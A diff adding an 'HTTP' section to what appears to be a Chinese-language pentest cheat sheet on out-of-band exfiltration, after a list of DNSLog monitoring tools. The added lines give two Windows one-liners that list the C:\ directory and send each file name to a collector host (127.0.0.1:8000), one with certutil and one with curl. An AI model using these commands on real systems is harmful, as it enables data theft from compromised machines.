@@ -29,3 +29,23 @@
 **平台搭建**
 - [BugScanTeam/DNSLog](https://github.com/BugScanTeam/DNSLog) - DNSLog 是一款监控 DNS 解析记录和 HTTP 访问记录的工具。
 - [lanyi1998/DNSlog-GO](https://github.com/lanyi1998/DNSlog-GO) - DNSLog-GO 是一款 golang 编写的监控 DNS 解析记录的工具，自带 WEB 界面
+
+---
+
+# HTTP
+
+**Windows**
+
+- certutil
+
+    使用 certutil 请求证书文件，并将下载文件重定向到 nul，无缓存、无需浏览器实现发起 http 请求
+    ```bash
+    for /F %x in ('dir /b c:\') do certutil -urlcache -split -f "http://127.0.0.1:8000/?result=%x" nul
+    ```
+
+- curl
+
+    win10 等环境支持 curl
+    ```bash
+    for /F %x in ('dir /b c:\') do curl http://127.0.0.1:8000/%x
+    ```
